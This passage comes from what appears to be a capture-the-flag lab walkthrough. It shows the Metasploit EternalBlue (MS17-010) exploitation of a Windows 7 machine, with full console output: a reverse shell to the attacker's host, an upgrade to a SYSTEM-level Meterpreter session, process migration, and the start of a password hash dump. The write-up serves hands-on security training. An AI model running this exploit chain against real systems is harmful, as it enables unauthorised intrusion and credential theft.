</code></pre><p>Exploit to get the shell. Background the shell to escalate privileges.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(windows/smb/ms17_010_eternalblue)%20%3E%20exploit%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Csource-ip%3E:4444%0A[*]%20%3Ctarget-ip%3E:445%20-%20Using%20auxiliary/scanner/smb/smb_ms17_010%20as%20check%0A[+]%20%3Ctarget-ip%3E:445%20%20%20%20%20%20%20-%20Host%20is%20likely%20VULNERABLE%20to%20MS17-010!%20-%20Windows%207%20Professional%207601%20Service%20Pack%201%20x64%20(64-bit)%0A[*]%20%3Ctarget-ip%3E:445%20%20%20%20%20%20%20-%20Scanned%201%20of%201%20hosts%20(100%25%20complete)%0A[*]%20%3Ctarget-ip%3E:445%20-%20Connecting%20to%20target%20for%20exploitation.%0A[+]%20%3Ctarget-ip%3E:445%20-%20Connection%20established%20for%20exploitation.%0A[+]%20%3Ctarget-ip%3E:445%20-%20Target%20OS%20selected%20valid%20for%20OS%20indicated%20by%20SMB%20reply%0A[*]%20%3Ctarget-ip%3E:445%20-%20CORE%20raw%20buffer%20dump%20(42%20bytes)%0A[*]%20%3Ctarget-ip%3E:445%20-%200x00000000%20%2057%2069%206e%2064%206f%2077%2073%2020%2037%2020%2050%2072%206f%2066%2065%2073%20%20Windows%207%20Profes%0A[*]%20%3Ctarget-ip%3E:445%20-%200x00000010%20%2073%2069%206f%206e%2061%206c%2020%2037%2036%2030%2031%2020%2053%2065%2072%2076%20%20sional%207601%20Serv%0A[*]%20%3Ctarget-ip%3E:445%20-%200x00000020%20%2069%2063%2065%2020%2050%2061%2063%206b%2020%2031%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20ice%20Pack%201%0A[+]%20%3Ctarget-ip%3E:445%20-%20Target%20arch%20selected%20valid%20for%20arch%20indicated%20by%20DCE/RPC%20reply%0A[*]%20%3Ctarget-ip%3E:445%20-%20Trying%20exploit%20with%2012%20Groom%20Allocations.%0A[*]%20%3Ctarget-ip%3E:445%20-%20Sending%20all%20but%20last%20fragment%20of%20exploit%20packet%0A[*]%20%3Ctarget-ip%3E:445%20-%20Starting%20non-paged%20pool%20grooming%0A[+]%20%3Ctarget-ip%3E:445%20-%20Sending%20SMBv2%20buffers%0A[+]%20%3Ctarget-ip%3E:445%20-%20Closing%20SMBv1%20connection%20creating%20free%20hole%20adjacent%20to%20SMBv2%20buffer.%0A[*]%20%3Ctarget-ip%3E:445%20-%20Sending%20final%20SMBv2%20buffers.%0A[*]%20%3Ctarget-ip%3E:445%20-%20Sending%20last%20fragment%20of%20exploit%20packet!%0A[*]%20%3Ctarget-ip%3E:445%20-%20Receiving%20response%20from%20exploit%20packet%0A[+]%20%3Ctarget-ip%3E:445%20-%20ETERNALBLUE%20overwrite%20completed%20successfully%20(0xC000000D)!%0A[*]%20%3Ctarget-ip%3E:445%20-%20Sending%20egg%20to%20corrupted%20connection.%0A[*]%20%3Ctarget-ip%3E:445%20-%20Triggering%20free%20of%20corrupted%20buffer.%0A[*]%20Sending%20stage%20(336%20bytes)%20to%20%3Ctarget-ip%3E%0A[*]%20Command%20shell%20session%201%20opened%20(%3Csource-ip%3E:4444%20-%3E%20%3Ctarget-ip%3E:49186)%20at%202021-04-24%2003:00:24%20+0000%0A[+]%20%3Ctarget-ip%3E:445%20-%20=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=%0A[+]%20%3Ctarget-ip%3E:445%20-%20=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=%0A[+]%20%3Ctarget-ip%3E:445%20-%20=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=%0A%0AMicrosoft%20Windows%20[Version%206.1.7601]%0ACopyright%20(c)%202009%20Microsoft%20Corporation.%20%20All%20rights%20reserved.%0A%0AC:%5CWindows%5Csystem32%3E%5EZ%0ABackground%20session%201?%20[y/N]%20%20y" type="button"></button></div></div><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit

[*] Started reverse TCP handler on &lt;source-ip&gt;:4444
[*] &lt;target-ip&gt;:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] &lt;target-ip&gt;:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] &lt;target-ip&gt;:445       - Scanned 1 of 1 hosts (100% complete)
[*] &lt;target-ip&gt;:445 - Connecting to target for exploitation.
[+] &lt;target-ip&gt;:445 - Connection established for exploitation.
[+] &lt;target-ip&gt;:445 - Target OS selected valid for OS indicated by SMB reply
[*] &lt;target-ip&gt;:445 - CORE raw buffer dump (42 bytes)
[*] &lt;target-ip&gt;:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] &lt;target-ip&gt;:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] &lt;target-ip&gt;:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] &lt;target-ip&gt;:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] &lt;target-ip&gt;:445 - Trying exploit with 12 Groom Allocations.
[*] &lt;target-ip&gt;:445 - Sending all but last fragment of exploit packet
[*] &lt;target-ip&gt;:445 - Starting non-paged pool grooming
[+] &lt;target-ip&gt;:445 - Sending SMBv2 buffers
[+] &lt;target-ip&gt;:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] &lt;target-ip&gt;:445 - Sending final SMBv2 buffers.
[*] &lt;target-ip&gt;:445 - Sending last fragment of exploit packet!
[*] &lt;target-ip&gt;:445 - Receiving response from exploit packet
[+] &lt;target-ip&gt;:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] &lt;target-ip&gt;:445 - Sending egg to corrupted connection.
[*] &lt;target-ip&gt;:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to &lt;target-ip&gt;
[*] Command shell session 1 opened (&lt;source-ip&gt;:4444 -&gt; &lt;target-ip&gt;:49186) at 2021-04-24 03:00:24 +0000
[+] &lt;target-ip&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] &lt;target-ip&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] &lt;target-ip&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;^Z
Background session 1? [y/N]  y
</code></pre><h2 id="task-3---escalate">Task 3 - Escalate</h2><p>From <code>msfconsole -q</code> console, convert the regular shell to <code>meterpreter</code> shell. Get the options, set required variables and set the backgrounded shell <code>session</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20exploit(windows/smb/ms17_010_eternalblue)%20%3E%20use%20post/multi/manage/shell_to_meterpreter%0A%0Amsf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20show%20options%0A%0AModule%20options%20(post/multi/manage/shell_to_meterpreter):%0A%0AName%20%20%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20%20%20---------------%20%20--------%20%20-----------%0AHANDLER%20%20true%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Start%20an%20exploit/multi/handler%20to%20receive%20the%20connection%0ALHOST%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20no%20%20%20%20%20%20%20%20IP%20of%20host%20that%20will%20receive%20the%20connection%20from%20the%20payload%20(Will%20try%20to%20auto%20detect).%0ALPORT%20%20%20%204433%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20Port%20for%20payload%20to%20connect%20to.%0ASESSION%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20session%20to%20run%20this%20module%20on.%0A%0Amsf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20set%20LHOST%2010.10.31.24%0ALHOST%20=%3E%2010.10.31.24%0A%0Amsf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20sessions%0A%0AActive%20sessions%0A%0AId%20%20Name%20%20Type%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Information%20%20Connection%0A--%20%20----%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-----------%20%20----------%0A1%20%20%20%20%20%20%20%20%20shell%20x64/windows%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010.10.31.24:4444%20-%3E%2010.10.57.41:49186%20(10.10.57.41)%0A%0Amsf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20set%20session%201%0Asession%20=%3E%201" type="button"></button></div></div><pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter

msf5 post(multi/manage/shell_to_meterpreter) &gt; show options

Module options (post/multi/manage/shell_to_meterpreter):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
LPORT    4433             yes       Port for payload to connect to.
SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) &gt; set LHOST 10.10.31.24
LHOST =&gt; 10.10.31.24

msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions

Active sessions

Id  Name  Type               Information  Connection
--  ----  ----               -----------  ----------
1         shell x64/windows               10.10.31.24:4444 -&gt; 10.10.57.41:49186 (10.10.57.41)

msf5 post(multi/manage/shell_to_meterpreter) &gt; set session 1
session =&gt; 1
</code></pre><p>Exploit to create <code>meterpreter</code> shell <code>session</code> from regular shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20exploit%0A%0A[*]%20Upgrading%20session%20ID:%201%0A[*]%20Starting%20exploit/multi/handler%0A[*]%20Started%20reverse%20TCP%20handler%20on%2010.10.31.24:4433%0A[*]%20Post%20module%20execution%20completed%0A[*]%20Sending%20stage%20(176195%20bytes)%20to%2010.10.57.41%0A[*]%20Meterpreter%20session%202%20opened%20(10.10.31.24:4433%20-%3E%2010.10.57.41:49195)%20at%202021-04-24%2003:07:17%20+0000%0A[*]%20Stopping%20exploit/multi/handler%0A%0Amsf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20sessions%0A%0AActive%20sessions%0A%0AId%20%20Name%20%20Type%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Information%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Connection%0A--%20%20----%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-----------%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20----------%0A1%20%20%20%20%20%20%20%20%20shell%20x64/windows%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2010.10.31.24:4444%20-%3E%2010.10.57.41:49186%20(10.10.57.41)%0A2%20%20%20%20%20%20%20%20%20meterpreter%20x86/windows%20%20NT%20AUTHORITY%5CSYSTEM%20@%20JON-PC%20%2010.10.31.24:4433%20-%3E%2010.10.57.41:49195%20(10.10.57.41)%0A%0Amsf5%20post(multi/manage/shell_to_meterpreter)%20%3E%20sessions%202%0A[*]%20Starting%20interaction%20with%202...%0A%0Ameterpreter%20%3E%20" type="button"></button></div></div><pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.31.24:4433
[*] Post module execution completed
[*] Sending stage (176195 bytes) to 10.10.57.41
[*] Meterpreter session 2 opened (10.10.31.24:4433 -&gt; 10.10.57.41:49195) at 2021-04-24 03:07:17 +0000
[*] Stopping exploit/multi/handler

msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions

Active sessions

Id  Name  Type                     Information                   Connection
--  ----  ----                     -----------                   ----------
1         shell x64/windows                                      10.10.31.24:4444 -&gt; 10.10.57.41:49186 (10.10.57.41)
2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.31.24:4433 -&gt; 10.10.57.41:49195 (10.10.57.41)

msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions 2
[*] Starting interaction with 2...

meterpreter &gt; 
</code></pre><p>Check the <code>user</code> and <code>system</code> information.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20getuid%0AServer%20username:%20NT%20AUTHORITY%5CSYSTEM%0A%0Ameterpreter%20%3E%20sysinfo%0AComputer%20%20%20%20%20%20%20%20:%20JON-PC%0AOS%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Windows%207%20(6.1%20Build%207601,%20Service%20Pack%201).%0AArchitecture%20%20%20%20:%20x64%0ASystem%20Language%20:%20en_US%0ADomain%20%20%20%20%20%20%20%20%20%20:%20WORKGROUP%0ALogged%20On%20Users%20:%200%0AMeterpreter%20%20%20%20%20:%20x86/windows" type="button"></button></div></div><pre><code>meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter &gt; sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
</code></pre><p>Check the current processes and migrate to <code>conhost.exe</code> process.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20ps%0A%0AProcess%20List%0A%0APID%20%20%20PPID%20%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Arch%20%20Session%20%20User%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Path%0A---%20%20%20----%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20----%20%20-------%20%20----%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20----%0A0%20%20%20%20%200%20%20%20%20%20[System%20Process]%0A4%20%20%20%20%200%20%20%20%20%20System%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%0A416%20%20%204%20%20%20%20%20smss.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csmss.exe%0A428%20%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A488%20%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A564%20%20%20556%20%20%20csrss.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Ccsrss.exe%0A612%20%20%20556%20%20%20wininit.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cwininit.exe%0A624%20%20%20604%20%20%20csrss.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%201%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Ccsrss.exe%0A664%20%20%20604%20%20%20winlogon.exe%20%20%20%20%20%20%20%20%20%20x64%20%20%201%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cwinlogon.exe%0A712%20%20%20612%20%20%20services.exe%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cservices.exe%0A720%20%20%20612%20%20%20lsass.exe%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Clsass.exe%0A728%20%20%20612%20%20%20lsm.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Clsm.exe%0A836%20%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A900%20%20%20564%20%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A904%20%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A928%20%20%202260%20%20cmd.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSysWOW64%5Ccmd.exe%0A952%20%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1020%20%20664%20%20%20LogonUI.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%201%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5CLogonUI.exe%0A1080%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1180%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1300%20%20712%20%20%20spoolsv.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cspoolsv.exe%0A1344%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A1408%20%20712%20%20%20amazon-ssm-agent.exe%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%5CAmazon%5CSSM%5Camazon-ssm-agent.exe%0A1484%20%20712%20%20%20LiteAgent.exe%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%5CAmazon%5CXentools%5CLiteAgent.exe%0A1620%20%20712%20%20%20Ec2Config.exe%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CProgram%20Files%5CAmazon%5CEc2ConfigService%5CEc2Config.exe%0A1924%20%202900%20%20powershell.exe%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe%0A1936%20%20712%20%20%20TrustedInstaller.exe%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5Cservicing%5CTrustedInstaller.exe%0A1948%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A2080%20%20712%20%20%20sppsvc.exe%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Csppsvc.exe%0A2120%20%20836%20%20%20WmiPrvSE.exe%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CNETWORK%20SERVICE%20%20C:%5CWindows%5CSystem32%5Cwbem%5CWmiPrvSE.exe%0A2260%20%201924%20%20powershell.exe%20%20%20%20%20%20%20%20x86%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5Csyswow64%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe%0A2400%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CLOCAL%20SERVICE%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A2580%20%20712%20%20%20svchost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Csvchost.exe%0A2612%20%20712%20%20%20vds.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cvds.exe%0A2712%20%20712%20%20%20SearchIndexer.exe%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5CSearchIndexer.exe%0A2728%20%20564%20%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A2852%20%201300%20%20cmd.exe%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Ccmd.exe%0A3036%20%20564%20%20%20conhost.exe%20%20%20%20%20%20%20%20%20%20%20x64%20%20%200%20%20%20%20%20%20%20%20NT%20AUTHORITY%5CSYSTEM%20%20%20%20%20%20%20%20%20%20%20C:%5CWindows%5CSystem32%5Cconhost.exe%0A%0Ameterpreter%20%3E%20migrate%203036%0A[*]%20Migrating%20from%202260%20to%203036...%0A[*]%20Migration%20completed%20successfully." type="button"></button></div></div><pre><code>meterpreter &gt; ps

Process List

PID   PPID  Name                  Arch  Session  User                          Path
---   ----  ----                  ----  -------  ----                          ----
0     0     [System Process]
4     0     System                x64   0
416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
428   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
488   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
900   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
928   2260  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1020  664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
1080  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1180  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
1300  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
1344  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1408  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
1484  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
1620  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
1924  2900  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
1936  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
1948  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
2080  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
2120  836   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
2260  1924  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
2400  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
2580  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
2612  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
2712  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
2728  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
2852  1300  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
3036  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe

meterpreter &gt; migrate 3036
[*] Migrating from 2260 to 3036...
[*] Migration completed successfully.
</code></pre><h2 id="task-4---cracking">Task 4 - Cracking</h2><p>Use <code>msfconsole -q</code> to dump <code>hashes</code> of users.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="meterpreter%20%3E%20hashdump%0AAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::%0AGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::%0AJon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" type="button"></button></div></div><pre><code>meterpreter &gt; hashdump
